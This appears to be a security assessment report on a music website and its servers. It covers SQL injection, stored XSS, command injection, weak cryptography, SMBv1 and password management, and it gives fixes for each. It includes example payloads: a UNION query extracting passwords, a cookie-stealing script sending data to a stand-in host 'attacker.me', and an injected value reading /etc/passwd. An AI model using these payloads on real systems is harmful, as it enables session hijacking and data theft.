# Security assessment report

## I. Summary

After performing security assessment on the web application and the systems, we detected in total 8 security findings, including 6 high-severity findings and 2 medium-severity findings. The list of findings are described in the following table:

| ID | Finding                                       |Severity| Likelihood |
|----| ----------------------------------------------|:------:| :------:   |
| 1  | SQL Injection                                 | High   | High       |
| 2  | Stored cross site scripting (XSS)             | High   | High       |
| 3  | Command injection                             | High   | High       |
| 4  | Excessive data disclosure                     | High   | High       |
| 5  | Insufficient cryptography                     | High   | Medium     |
| 6  | Use of vulnerable component                   | High   | High       |
| 7  | Password policy is not defined                | Medium | Medium     |
| 8  | Weak local administrator password management  | Medium | Medium     |

We suggest to fix the high-severity vulnerabilities with high likelihood and high severity as soon as possible, and focus on the medium severity vulnerabilities after that.

In order to improve the overall security posture of the company, it is advisable that the company consider the following practices:
- Build security process for the company following ISO 27001. The technical detail can be based on ISO 27002. The mandatory processes should be: vulnerability management, patch management, secure development, internal auditing.
- Multiple security tools can be used to improve application security: static application security analysis (SAST), dynamic application security analysis (DAST), software composition analysis (SCA). All these tools should be integrated into the CI pipelines of the application to early detect vulnerabilities in the application ("shift-left" security testing). Additionally, periodical penetration testing can also be useful (e.g, once per quarter).
- In terms of configuration hardening, CIS (https://www.cisecurity.org/cis-benchmarks/) or STIGS (https://public.cyber.mil/stigs/) baselines can be used to periodically test and harden configuration of the servers.
- To further protect the system (defense-in-depth), the company can consider to implement the following security tools: Web application firewall (WAF), intrusion detection/prevention system (IDPS), Advanced Threat Protection (ATP).

## II. Finding detail
### 1. SQL Injection (High)
#### a. Description
The music search page has a SQL Injection vulnerability. When user input a search string, the web application creates SQL query string by concatenating the search string with predefined SQL query.

```
$keyword = $_GET["keyword"];
$query = "SELECT name,description,author from songs where name LIKE '%" + $keyword + "'";
```
By sending a malicious keyword, attackers can modify the SQL query string to extract data from other tables. For example, if attackers send the string ***0000' UNION SELECT username, password, email from users ' #***, then the query string will become
SELECT name,description,author from songs where name LIKE '%00000' UNION SELECT username, password, email from users 

#### b. Impact
Malicious attackers can use search page extract data from the database and can control the server by uploading a shell into the server.

#### c. Solution
Build SQL query string using the prepared statement instead of concatenating strings. For instance, to fix the above code, we can use:
```
$keyword = $_GET["keyword"];
$stmt = $conn->prepare("SELECT name,description,author from songs where name LIKE ?");
$stmt->bind_param("s", $keyword);
```

#### d. Reference
- https://owasp.org/www-community/attacks/xss
- https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html

### 2. Stored cross site scripting (XSS) (High)
#### a. Description
The website allows users to comment on a song. After the user posts a comment, it will be stored in the database and displayed to all the users visiting the page.
The code to display the comment is as follows:
```
while ($row = $result->fetch_assoc()) {
    echo '<p class="user_comment">' . $row["comment"]. '</p>';
  }
```
If attackers submit malicious javascript as the comment, it will be executed in the browsers of users who view the comment. For example, the attacker can submit the following comment to steal user cookie:
```
<script>document.write('<img src="https://attacker.me/collect.gif?cookie="' + document.cookie + '" width=0 height=0 />')</script>
```
Additionally, the web application allows javascript to directly access the cookie, which allows attackers to directly access user session id.

#### b. Impact
An attacker can post a malicious comment to steal sessions of users who access the page.

#### c. Solution
- Convert the special HTML characters to HTML entities before returning them to the client. For example, the above code can be fixed using htmlspecialchars:
```
while ($row = $result->fetch_assoc()) {
    echo '<p class="user_comment">' . htmlspecialchars($row["comment"]) . '</p>';
  }
```
- Set the HttpOnly flag in the HTTP Response so cookie can not be accessed directly by javascript.

#### d. Reference
- https://owasp.org/www-community/attacks/xss/
- https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
- https://owasp.org/www-community/HttpOnly

### 3. Command injection (High)
#### a. Description
In order to get the total number of songs of a musician, the web frontend allows users to choose the musician name in a drop-down list. The username of the musician will then be submitted to the web server. In the backend, the web application will use the "ls" command to list the content and count number of songs of the corresponding folder of the musician in the file system to retrieve the song list.
The code snippet to retrieve the song list in the server is as follows:
```
$author = $_GET["author"];
system("ls -l /var/songs/" + $author + " | wc -l", $output);
```
The attacker can send a malicious username in the author parameter to execute arbitrary command. For example, if the attacker sends the value ***quangld; cat /etc/passwd # "***, the web application will also read the output of /etc/passwd file.

#### b. Impact
The attacker can execute commands in the server. They can even download a shell to control the server.

#### c. Solution
Avoid directly using functions that trigger system commands. If that is not possible, escape special shell characters before passing them to the function. For example, the above command can be fixed using:
```
system("ls -l /var/songs/" + escapeshellcmd($author) + " | wc -l", $output);
```

#### d. Reference
- https://owasp.org/www-community/attacks/Command_Injection
- https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html

### 4. Excessive data disclosure (High)
#### a. Description
In user registration process, the application wants to check if the username already exists and it perform the validation by sending the new username to the API at /api/uservalidation/username. In this vulnerable application, the web application returns a JSON object containing the following information if the user is already exist:

```
{
"usernameid": 1,
"username": "abc",
"email": "abc@musiccompany.com",
"phone": "0123456789"
}
```
As the returned JSON object contains too much information, the attacker can retrieve information of all users in the database by sending the list of usernames on a word list. 

#### b. Impact
This is a unauthenticated vulnerability that allows the attackers to retrieve information of all users in the database.

#### c. Solution
The Web API should not send extra information. In this case, instead of sending all data of the user, it should send a list of possible usernames that user can use.

#### d. Reference
- https://apisecurity.io/encyclopedia/content/owasp/api3-excessive-data-exposure.htm

### 5. Insufficient cryptography (High)
#### a. Description
There are two security issues related to the login process:
- The first weakness is related to the way the web application stores password. In order to store the password in the database, the web application first hash the password with SHA-256 and then store the hashed password in the database. However, since the password is not hashed with salt (a random value), the attacker can pre-calculate hash values of common passwords and use these precalculated hash values (rainbow table) to compare with the hashed values in the database to crack the password if they can obtain the database.
- The second issue is related to the login process. In order to strengthen security of the login process, the web application frontend decides not to send password in clear text via https. However, the developers decided to handle the encryption and transfer of password themselves via http. The web client first encrypt the password with a key, then send the encrypted password via http to the server. After receving the encrypted password, the server decrypts the encrypted password and compare it with user password in the database. This approach has two issues: (1) the attackers can view source code of the web client to retrieve the key and decrypt the encrypted password, and (2) even without decrypting the encrypted password, the attacker can also capture the encrypted password and resend this value to log in to the server.

#### b. Impact
- The first weakness allows the attacker to crack password of users if they can obtain the database.
- The second issue allows the attackers to capture password of a user and log in using the user password.

#### c. Solution
- Use password-hashing functions (e.g, bcrypt) or use salting with hash to store the password.
- Use TLS instead of encrypting the password in the web page (client side).

#### d. Reference
- https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html
- https://cheatsheetseries.owasp.org/cheatsheets/Transport_Layer_Protection_Cheat_Sheet.html

### 6. Use of vulnerable component (High)
#### a. Description
According to auditing result, multiple Windows servers and personal computers are supporting SMB protocol version 1 which is vulnerable to EternalBlue vulnerability. This unauthenticated vulnerability allows attackers to gain access to the computers by interacting with SMB v1.

Moreover, SMB ports of Windows cloud servers (139, 445) are publicly accessible from the Internet.

#### b. Impact
With this configuration, attackers can easily gain access to the servers via the Internet. Besides, automated malware can also quickly spread through the network by exploiting the vulnerability.

#### c. Solution
- Upgrade the SMB version to the latest version to fix the vulnerability and disable SMB version 1.
- Use patch management solution to continuously monitor and update softwares in the system to the latest version.

#### d. Reference
- https://www.loginradius.com/blog/async/eternal-blue-retrospective/
- https://www.gartner.com/reviews/market/client-management-tools

### 7. Password policy is not defined (Medium)
#### a. Description
According to system audit result of the servers, the password policy (password complexity, password expiration time) for admin account is not defined. Besides, the admin account password has not been changed for more than 1 year. Additionally, root user is allowed to log in to the server via SSH.

#### b. Impact
Without strong password policy, it is easier for the attackers to perform password attack on the server. Additionally, system administrators tend to set the same default password for different servers. Therefore, if a server is compromised, it is likely that the attackers can access other servers using the same password.

#### c. Solution
- Set a strong password policy for servers.
- Use Privileged Access Management (PAM) solution in case there are many servers that need to be managed.

#### d. Reference
- https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/7/html/security_guide/chap-hardening_your_system_with_tools_and_services
- https://www.gartner.com/reviews/market/privileged-access-management

### 8. Weak local administrator password management (Medium)
#### a. Description
There are two security issues related to local administrator account password management.
The first issue is that all local administrator account of employees' personal computers use the same password.
The second problem is related to administrator password management process. The company utilities Active Directory domain to manage personal computers. In order to periodically change the Administrator password of personal computers, the system administrator uses Group Policy (GPO) to deploy a bat script to change the password. However, the bat script is publicly accessible and it contains the new password in plain text. Therefore, everybody in the network can access the bat file to read the new password. 

#### b. Impact
When the local administrator accounts use the same password, if a computer is infected by a malware, it can quickly spread through other computers in the same network.

#### c. Solution
- Use local administrator password management tool (e.g, Microsoft LAPS) to manage the local administrator passwords of personal computers.
- It should be configured that user should use normal user instead of administrator account in their daily activities.

#### d. Reference
- https://support.microsoft.com/en-us/topic/microsoft-security-advisory-local-administrator-password-solution-laps-now-available-may-1-2015-404369c3-ea1e-80ff-1e14-5caafb832f53
